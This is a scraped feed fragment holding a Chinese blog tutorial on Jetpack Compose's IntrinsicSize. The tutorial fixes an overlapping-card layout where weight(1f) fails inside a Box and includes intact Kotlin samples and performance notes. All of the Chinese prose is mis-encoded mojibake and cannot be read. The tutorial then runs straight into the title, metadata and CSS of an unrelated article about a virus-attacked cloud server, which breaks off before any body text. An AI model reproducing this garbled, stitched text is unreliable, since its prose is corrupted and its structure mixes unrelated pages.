<p>è¿™æ—¶ <strong><code>IntrinsicSize</code></strong> å°±æ´¾ä¸Šç”¨åœºäº†â€”â€”ç›¸ä¿¡æˆ‘ï¼Œä¸€æ—¦ä½ ç†è§£äº†å®ƒï¼Œå®ƒå°†æˆä¸ºä½  Compose å·¥å…·ç®±ä¸­æœ€å¼ºå¤§çš„å·¥å…·ä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-0">é—®é¢˜ï¼šä¸€ä¸ªçœŸå®çš„ç”Ÿäº§åœºæ™¯</h2>
<p>æœ€è¿‘ï¼Œæˆ‘æ­£åœ¨ä¸ºä¸€ä¸ªåº”ç”¨ç¨‹åºæ„å»ºè¯¦æƒ…é¡µé¢ã€‚è®¾è®¡è¦æ±‚ï¼š</p>
<ol>
<li>
<p>é¡¶éƒ¨æ”¾ç½®ä¸€å¼ <strong>æ ‡é¢˜å›¾ç‰‡</strong></p>
</li>
<li>
<p>ä¸€å¼ <strong>å¡ç‰‡</strong>ï¼Œä¸æ ‡é¢˜å›¾ç‰‡é‡å  56dp</p>
</li>
<li>
<p>ä»æ ‡é¢˜å›¾ç‰‡åˆ°æŸ”å’Œç°è‰²èƒŒæ™¯çš„<strong>å¹³æ»‘è¿‡æ¸¡</strong></p>
</li>
</ol>
<p>æˆ‘ä»¬æƒ³è¦å®ç°çš„æ•ˆæœå¦‚ä¸‹ï¼š</p>
<blockquote>
<p><em><strong>ğŸ’¡ è®¾è®¡ç›®æ ‡ï¼š</strong></em> <em>åˆ›å»ºä¸€ä¸ªå¡ç‰‡ï¼Œä½¿å…¶ä¼˜é›…åœ°ä¸æ ‡é¢˜å›¾ç‰‡é‡å ï¼Œå¹¶å®ç°æ— ç¼çš„èƒŒæ™¯è¿‡æ¸¡ã€‚</em></p>
</blockquote>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b027b0681c9444d90b46765cead83d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=vm6WiZb6vsTP2u32FoGpXi07S9o%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">æŒ‘æˆ˜</h2>
<p>æˆ‘éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«ä¸¤å±‚çš„â€œç›’å­Boxâ€ï¼š</p>
<ul>
<li>
<p><strong>å›¾å±‚ 1ï¼ˆèƒŒæ™¯ï¼‰ï¼š</strong> é¡¶éƒ¨ 56dp çš„é€æ˜åŒºåŸŸï¼Œç„¶åæ˜¯æŸ”å’Œçš„ç°è‰²èƒŒæ™¯</p>
</li>
<li>
<p><strong>å›¾å±‚ 2ï¼ˆå¡ç‰‡ï¼‰ï¼š</strong> ç»˜åˆ¶åœ¨é¡¶éƒ¨çš„å®é™…å¡ç‰‡å†…å®¹</p>
</li>
</ul>
<p>è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ªä½œå“å°è¯•ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">OverlappingCardContent</span><span class="hljs-params">(overlapHeight: <span class="hljs-type">Dp</span>)</span></span> {
    Box(modifier = Modifier.fillMaxWidth()) {
        <span class="hljs-comment">// Layer 1: Background</span>
        Column(modifier = Modifier.fillMaxWidth()) {
            Spacer(modifier = Modifier.height(overlapHeight)) <span class="hljs-comment">// 56dp transparent</span>
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .weight(<span class="hljs-number">1f</span>)  <span class="hljs-comment">// Fill remaining space with soft background</span>
                    .background(color = Color.LightGray)
            )
        }

        <span class="hljs-comment">// Layer 2: Card</span>
        Card(modifier = Modifier.fillMaxWidth()) {
            <span class="hljs-comment">// Card content...</span>
        }
    }
}
</code></pre>
<p><strong>ä½†æ˜¯è¿™è¡Œä¸é€šï¼</strong> ğŸ˜©</p>
<p><code>weight(1f)</code>ä¿®é¥°ç¬¦å¯¼è‡´äº†é—®é¢˜ã€‚å¸ƒå±€è¦ä¹ˆæ„å¤–åœ°æŠ˜å ï¼Œè¦ä¹ˆæ„å¤–åœ°å±•å¼€ã€‚</p>
<h2 data-id="heading-2">äº†è§£æ ¹æœ¬åŸå› </h2>
<p>ä¸ºäº†ç†è§£ä¸ºä»€ä¹ˆä¼šå¤±è´¥ï¼Œæˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹ Compose å¸ƒå±€çš„å·¥ä½œåŸç†ã€‚</p>
<h3 data-id="heading-3">Compose å¸ƒå±€ï¼šå•éç³»ç»Ÿ</h3>
<p>ä¸ºäº†æé«˜æ€§èƒ½ï¼ŒCompose å¸ƒå±€é‡‡ç”¨<strong>å•æ¬¡éå†</strong>æ–¹å¼æµ‹é‡å¸ƒå±€ã€‚æ¯ä¸ªå¯ç»„åˆå…ƒç´ ï¼š</p>
<ol>
<li>
<p>ä»çˆ¶å…ƒç´ æ¥æ”¶çº¦æŸ</p>
</li>
<li>
<p>æµ‹é‡å…¶å­å…ƒç´ </p>
</li>
<li>
<p>ç¡®å®šè‡ªèº«å¤§å°</p>
</li>
<li>
<p>æ”¾ç½®å…¶å­å…ƒç´ </p>
</li>
</ol>
<p>é—®é¢˜åœ¨äºï¼šå½“åƒ <code>Box</code> è¿™æ ·çš„çˆ¶å…ƒç´ æµ‹é‡å…¶å­å…ƒç´ æ—¶ï¼Œæ¯ä¸ªå­å…ƒç´ éƒ½ä¸çŸ¥é“å…¶ä»–å­å…ƒç´ çš„å¤§å°ã€‚å®ƒä»¬æ˜¯ç‹¬ç«‹æµ‹é‡çš„ã€‚</p>
<h2 data-id="heading-4">ä¸ºä»€ä¹ˆ <code>weight(1f)</code> ä¼šå¤±è´¥</h2>
<p><code>weight()</code> ä¿®é¥°ç¬¦è¡¨ç¤ºï¼šâ€œå æ®å‰©ä½™ç©ºé—´çš„ X å€ã€‚â€</p>
<p>ä½†æ˜¯å‰©ä½™ç©ºé—´æŒ‡çš„æ˜¯<strong>ä»€ä¹ˆ</strong>ï¼Ÿ<code>Box</code> å…ƒç´ å°šæœªç¡®å®šè‡ªèº«é«˜åº¦â€”â€”å®ƒæ­£åœ¨ç­‰å¾…å­å…ƒç´ å‘ŠçŸ¥å…¶è‡ªèº«å¤§å°ã€‚è¿™ä¼šé€ æˆå¾ªç¯ä¾èµ–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">Box: <span class="hljs-string">"Children, how tall are you?"</span>
  â”œâ”€ Column: <span class="hljs-string">"I need 56dp + whatever weight(1f) gives me"</span>
  â”‚

  <span class="hljs-string">"But weight depends on your height, Box!"</span>
  â””â”€ Card: <span class="hljs-string">"I need ~180dp for my content"</span>  Box: <span class="hljs-string">"I'm confused..."</span> ğŸ¤¯
</code></pre>
<h2 data-id="heading-5">å¼•å…¥ IntrinsicSizeï¼šæ‰“ç ´å¾ªç¯ä¾èµ–</h2>
<p><code>IntrinsicSize</code> æ˜¯ Compose åœ¨å®é™…æµ‹é‡ä¹‹å‰å‘å­å…ƒç´ è¯¢é—®ä¸€ä¸ª<strong>å‡è®¾æ€§é—®é¢˜</strong> çš„æ–¹å¼ï¼š</p>
<blockquote>
<p><em><strong>â€œå¦‚æœæˆ‘ç»™ä½ æ— é™çš„ç©ºé—´ï¼Œä½ éœ€è¦çš„æœ€å°ï¼ˆæˆ–æœ€å¤§ï¼‰é«˜åº¦æ˜¯å¤šå°‘ï¼Ÿâ€</strong></em></p>
</blockquote>
<h2 data-id="heading-6">IntrinsicSize.Min ä¸ IntrinsicSize.Max</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cf9ddbec314433fa358f44c9985ee53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=NRXoBBMLT2ROOiCqJsAPmtmyxoo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">ä¿®å¤</h2>
<pre><code class="hljs language-kotlin" lang="kotlin">Box(
    modifier = Modifier
        .fillMaxWidth()
        .height(IntrinsicSize.Min)  <span class="hljs-comment">// â† The magic line!</span>
) {
    <span class="hljs-comment">// Layer 1: Background</span>
    Column(modifier = Modifier.fillMaxWidth()) {
        Spacer(modifier = Modifier.height(<span class="hljs-number">56.</span>dp))
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .weight(<span class="hljs-number">1f</span>)
                .background(color = Color.LightGray)
        )
    }

    <span class="hljs-comment">// Layer 2: Card</span>
    Card(modifier = Modifier.fillMaxWidth()) {
        <span class="hljs-comment">// Card content...</span>
    }
}
</code></pre>
<p>ç°åœ¨å¸ƒå±€æ­£å¸¸äº†ï¼åŸå› å¦‚ä¸‹ï¼š</p>
<h2 data-id="heading-8">IntrinsicSize.Min å¦‚ä½•è§£å†³å†²çª</h2>
<p>å½“ <code>Box</code> ä½¿ç”¨ <code>height(IntrinsicSize.Min)</code> æ—¶ï¼Œå®ƒä¼šè¯¢é—®æ¯ä¸ªå­å…ƒç´ ï¼š</p>
<p><strong>åˆ—çš„æœ€å°å›ºæœ‰é«˜åº¦ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">Spacer: 56dp (fixed)
Weighted Box: 0dp (minimum, can shrink to nothing)
Total: 56dp
</code></pre>
<p><strong>å¡ç‰‡çš„æœ€å°å›ºæœ‰é«˜åº¦ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">Status row + Title + Subtitle + Button + Padding = ~180dp
Total: ~180dp
</code></pre>
<p><strong>Box é€‰æ‹©ï¼š</strong> <code>max(56dp, 180dp)</code> = <strong>180dp</strong></p>
<p>ä¸ºä»€ä¹ˆæ˜¯ <code>max()</code>ï¼Ÿå› ä¸º Box çš„é«˜åº¦éœ€è¦è¶³ä»¥å®¹çº³<strong>æ‰€æœ‰</strong>å­å…ƒç´ ï¼</p>
<p>ç°åœ¨å¸ƒå±€å®Œå…¨çŸ¥é“å¦‚ä½•é«˜åº¦è¦åˆé€‚ï¼Œ<code>weight(1f)</code> å¯ä»¥æ­£å¸¸å·¥ä½œï¼š</p>
<ul>
<li>
<p>ç›’å­é«˜åº¦ï¼š180dp</p>
</li>
<li>
<p>é—´è·ï¼š56dp</p>
</li>
<li>
<p>åŠ æƒèƒŒæ™¯ç›’å­ï¼š180dp â€” 56dp = <strong>124dp</strong></p>
</li>
</ul>
<h2 data-id="heading-9">å®Œæ•´è§£å†³æ–¹æ¡ˆï¼šé‡å å¡ç‰‡å¼ UI</h2>
<p>ä»¥ä¸‹æ˜¯æ”¯æŒæ­¤ UI çš„æœ€ç»ˆä»£ç ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> OVERLAP_HEIGHT = <span class="hljs-number">56.</span>dp
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">HeaderWithOverlappingCard</span><span class="hljs-params">(imageHeight: <span class="hljs-type">Dp</span>)</span></span> {
    LazyColumn {
        <span class="hljs-comment">// Create overlap: position content before header ends</span>
        item { 
            Spacer(modifier = Modifier.height(imageHeight - OVERLAP_HEIGHT)) 
        }

        item {
            OverlappingCardContent(overlapHeight = OVERLAP_HEIGHT)
        }
    }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">OverlappingCardContent</span><span class="hljs-params">(overlapHeight: <span class="hljs-type">Dp</span>)</span></span> {
    Box(
        modifier = Modifier
            .fillMaxWidth()
            .height(IntrinsicSize.Min)
    ) {
        <span class="hljs-comment">// Layer 1: Background transition</span>
        Column(modifier = Modifier.fillMaxWidth()) {
            Spacer(modifier = Modifier.height(overlapHeight)) <span class="hljs-comment">// Transparent over header</span>
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .weight(<span class="hljs-number">1f</span>)
                    .background(color = SoftGrayBackground)
            )
        }

        <span class="hljs-comment">// Layer 2: Card content (drawn on top)</span>
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = <span class="hljs-number">8.</span>dp),
            shape = RoundedCornerShape(<span class="hljs-number">12.</span>dp)
        ) {
            Column(modifier = Modifier.padding(<span class="hljs-number">24.</span>dp)) {
                Text(<span class="hljs-string">"âœ“ Success"</span>, color = Color.Green)
                Text(<span class="hljs-string">"â‚¹100 Cashback"</span>, style = MaterialTheme.typography.h4)
                Text(<span class="hljs-string">"Transaction complete"</span>)
                Spacer(modifier = Modifier.height(<span class="hljs-number">16.</span>dp))
                Button(onClick = {}) { Text(<span class="hljs-string">"View Details"</span>) }
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-10">å¯è§†åŒ–åˆ†è§£</h2>
<pre><code class="hljs language-kotlin" lang="kotlin">imageHeight = 200dp
overlapHeight = 56dp
</code></pre>
<pre><code class="hljs language-bash" lang="bash">LazyColumn positions:
â”œâ”€ Spacer: 144dp (200 - 56)
â””â”€ OverlappingCardContent starts at Y = 144dp
</code></pre>
<pre><code class="hljs language-bash" lang="bash">Inside OverlappingCardContent (height = 180dp via IntrinsicSize.Min):
â”œâ”€ Column Layer:
â”‚   â”œâ”€ Spacer: 56dp (transparent, header shows through)
â”‚   â””â”€ Background Box: 124dp (soft gray)
â””â”€ Card Layer: 180dp (drawn from top, overlaps header)
</code></pre>
<h2 data-id="heading-11">IntrinsicSize çš„å¸¸è§ç”¨ä¾‹</h2>
<h3 data-id="heading-12">1. ä¸€è¡Œä¸­é«˜åº¦ç›¸åŒçš„æŒ‰é’®</h3>
<p><strong>é—®é¢˜ï¼š</strong> æ–‡æœ¬é•¿åº¦ä¸åŒçš„æŒ‰é’®æœ€ç»ˆé«˜åº¦ä¹Ÿä¸åŒã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">Row(modifier = Modifier.height(IntrinsicSize.Min)) {
    Button(
        modifier = Modifier.weight(<span class="hljs-number">1f</span>).fillMaxHeight(),
        onClick = {}
    ) { Text(<span class="hljs-string">"Short"</span>) }

    Button(
        modifier = Modifier.weight(<span class="hljs-number">1f</span>).fillMaxHeight(),
        onClick = {}
    ) { Text(<span class="hljs-string">"This is a much\nlonger button\nwith more text"</span>) }
}
</code></pre>
<p><strong>ç»“æœï¼š</strong> ä¸¤ä¸ªæŒ‰é’®çš„é«˜åº¦éƒ½ä¸æœ€é«˜çš„æŒ‰é’®é«˜åº¦ç›¸åŒã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd649e881a4e414c863752eac8df27e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=R5UuRucbFgrVNft6gRKQdW8BYRs%3D" alt="3.png" width="70%" loading="lazy"/></p>
<h3 data-id="heading-13">2. åˆ†éš”çº¿ä¸çˆ¶å…ƒç´ é«˜åº¦åŒ¹é…</h3>
<p><strong>é—®é¢˜ï¼š</strong> åˆ†éš”çº¿æ— æ³•æ‹‰ä¼¸ä»¥åŒ¹é…å¤šè¡Œå†…å®¹ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">Row(modifier = Modifier.height(IntrinsicSize.Min)) {
    Text(<span class="hljs-string">"Left content\nwith multiple\nlines"</span>)

    Divider(
        modifier = Modifier
            .fillMaxHeight()
            .width(<span class="hljs-number">1.</span>dp)
    )

    Text(<span class="hljs-string">"Right"</span>)
}
</code></pre>
<p><strong>ç»“æœï¼š</strong> åˆ†éš”çº¿å¯ä»¥æ‹‰ä¼¸ä»¥åŒ¹é…å¤šè¡Œæ–‡æœ¬çš„é«˜åº¦ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a98827db35040439fa2d0659209ff1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=6yWDTszRwQlJcKzyZbqg0LpAdXE%3D" alt="4.png" width="70%" loading="lazy"/></p>
<h3 data-id="heading-14">3. å¸¦æœ‰åŠ¨æ€å†…å®¹å’Œå›ºå®šè¦†ç›–å±‚çš„å¡ç‰‡</h3>
<p><strong>é—®é¢˜ï¼š</strong> è¦†ç›–å±‚éœ€è¦ä¸å¡ç‰‡å®½åº¦åŒ¹é…ï¼Œä½†å¡ç‰‡å®½åº¦æ˜¯åŠ¨æ€çš„ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">Box(modifier = Modifier.width(IntrinsicSize.Max)) {
    Card {
        Column {
            Text(<span class="hljs-string">"Dynamic content here..."</span>)
            <span class="hljs-comment">// More content</span>
        }
    }

    <span class="hljs-comment">// Badge that should match card width</span>
    Badge(
        modifier = Modifier
            .align(Alignment.TopEnd)
            .fillMaxWidth()
    )
}
</code></pre>
<h2 data-id="heading-15">æ€§èƒ½ç›¸å…³æ³¨æ„äº‹é¡¹ âš ï¸</h2>
<p><code>IntrinsicSize</code> ä¼šè§¦å‘<strong>ä¸¤éæµ‹é‡</strong>ï¼š</p>
<ol>
<li>
<p>ç¬¬ä¸€éï¼šæŸ¥è¯¢å›ºæœ‰å°ºå¯¸</p>
</li>
<li>
<p>ç¬¬äºŒéï¼šå®é™…æµ‹é‡å’Œå¸ƒå±€</p>
</li>
</ol>
<p>è¿™ä¼šå¸¦æ¥ä¸€å®šçš„æ€§èƒ½å¼€é”€ã€‚è°¨æ…ä½¿ç”¨ï¼š</p>
<h2 data-id="heading-16">âœ… é€‚ç”¨åœºæ™¯</h2>
<ul>
<li>
<p>å¤æ‚çš„åˆ†å±‚ UIï¼ˆä¾‹å¦‚æˆ‘ä»¬çš„é‡å å¡ç‰‡ï¼‰</p>
</li>
<li>
<p>ä½¿åŒçº§å…ƒç´ å¤§å°ä¸€è‡´</p>
</li>
<li>
<p>ä½¿åˆ†éš”ç¬¦/åˆ†éš”çº¿ä¸å†…å®¹åŒ¹é…</p>
</li>
<li>
<p>éœ€è¦å­å…ƒç´ åè°ƒå¤§å°æ—¶</p>
</li>
</ul>
<h2 data-id="heading-17">âŒ é¿å…ä½¿ç”¨åœºæ™¯</h2>
<ul>
<li>
<p>åœ¨å¯èƒ½ä¼šé‡å¤æ•°ç™¾æ¬¡çš„ <code>LazyColumn</code>/<code>LazyRow</code> å…ƒç´ ä¸­</p>
</li>
<li>
<p>æ·±åº¦åµŒå¥—çš„å›ºæœ‰å°ºå¯¸</p>
</li>
<li>
<p>å½“å›ºå®šå°ºå¯¸æˆ– <code>wrapContentHeight()</code> å¯ä»¥æ»¡è¶³éœ€æ±‚æ—¶</p>
</li>
<li>
<p>åœ¨æ€§èƒ½å…³é”®è·¯å¾„ä¸­</p>
</li>
</ul>
<h2 data-id="heading-18">è¦ç‚¹</h2>
<ol>
<li>
<p><code>**IntrinsicSize.Min**</code> = "ä½¿ç”¨å­å…ƒç´ æ‰€éœ€çš„æœ€å°é«˜åº¦"</p>
</li>
<li>
<p><code>**IntrinsicSize.Max**</code> = "ä½¿ç”¨å­å…ƒç´ å¯èƒ½éœ€è¦çš„æœ€å¤§é«˜åº¦"</p>
</li>
<li>
<p>å®ƒè§£å†³äº†çˆ¶å…ƒç´ å’Œå­å…ƒç´ å°ºå¯¸ä¹‹é—´çš„å¾ªç¯ä¾èµ–å…³ç³»</p>
</li>
<li>
<p>å¯¹äºå­å…ƒç´ ä½¿ç”¨ <code>weight()</code> æˆ– <code>fillMaxHeight()</code> çš„åˆ†å±‚ UI è‡³å…³é‡è¦</p>
</li>
<li>
<p>ä¼šå¸¦æ¥æ€§èƒ½å¼€é”€â€”â€”è¯·è°¨æ…ä½¿ç”¨</p>
</li>
</ol>
<h2 data-id="heading-19">ç»“è®º</h2>
<p><code>IntrinsicSize</code> çœ‹ä¼¼æ˜¯ä¸€ä¸ªå°ä¼—çš„ APIï¼Œä½†å®ƒå¯¹äºåœ¨ Compose ä¸­æ„å»ºå¤æ‚çš„ UI è‡³å…³é‡è¦ã€‚æˆ‘ä»¬æ„å»ºçš„é‡å å¡ç‰‡æ¨¡å¼åªæ˜¯å…¶ä¸­ä¸€ä¸ªä¾‹å­â€”â€”å½“ä½ éœ€è¦åè°ƒåŒçº§å…ƒç´ çš„å¤§å°ï¼Œæˆ–è€…å½“åˆ†å±‚å¸ƒå±€éœ€è¦â€œç»Ÿä¸€â€å°ºå¯¸æ—¶ï¼Œä½ ä¼šå‘ç°å®ƒéå¸¸å®ç”¨ã€‚</p>
<p>ä¸‹æ¬¡å½“ä½ çš„ Compose å¸ƒå±€åœ¨ä½¿ç”¨ <code>weight()</code> æˆ– <code>fillMaxHeight()</code> æ—¶å‡ºç°å¼‚å¸¸è¡Œä¸ºæ—¶ï¼Œè¯·è®°ä½ï¼š<strong>IntrinsicSize æˆ–è®¸èƒ½å¸®ä½ è§£å†³é—®é¢˜</strong>ã€‚</p>
<p><em>å¦‚æœä½ æœ‰ä»»ä½•ç–‘é—®æˆ–å‘ç°äº† IntrinsicSize çš„å…¶ä»–åˆ›æ„ç”¨æ³•ï¼Œè¯·åœ¨ä¸‹æ–¹ç•™è¨€ï¼</em></p>
<p><strong>å…³æ³¨æˆ‘ï¼Œè·å–æ›´å¤š Android å¼€å‘æŠ€å·§ã€‚</strong></p>
<blockquote>
<p>æ¬¢è¿æœç´¢å¹¶å…³æ³¨ <em>å…¬ä¼—å·<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fqrcode%3Fscene%3D10000004%26size%3D512%26__biz%3DMzU1MDg0NDczNA%3D%3D%26mid%3D2247484417%26idx%3D1%26sn%3D60c15f0d3c4be75e37748c2472a74102" target="_blank" title="https://mp.weixin.qq.com/mp/qrcode?scene=10000004&amp;size=512&amp;__biz=MzU1MDg0NDczNA==&amp;mid=2247484417&amp;idx=1&amp;sn=60c15f0d3c4be75e37748c2472a74102" ref="nofollow noopener noreferrer">ã€Œç¨€æœ‰çŒ¿è¯‰ã€</a></em> è·å–æ›´å¤šçš„ä¼˜è´¨æ–‡ç« ï¼</p>
<p>ä¿æŠ¤åŸåˆ›ï¼Œè¯·å‹¿è½¬è½½ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸€ç›´è¢«ç—…æ¯’æ”»å‡»ï¼Œè¯¥å¦‚ä½•æ’æŸ¥å‘¢ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600990891207016475</link>    <guid>https://juejin.cn/post/7600990891207016475</guid>    <pubDate>2026-01-30T12:12:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891207016475" data-draft-id="7600752623069249546" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸€ç›´è¢«ç—…æ¯’æ”»å‡»ï¼Œè¯¥å¦‚ä½•æ’æŸ¥å‘¢ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T12:12:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90åæ™¨ä»”"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸€ç›´è¢«ç—…æ¯’æ”»å‡»ï¼Œè¯¥å¦‚ä½•æ’æŸ¥å‘¢ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90åæ™¨ä»”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:12:39.000Z" title="Fri Jan 30 2026 12:12:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body 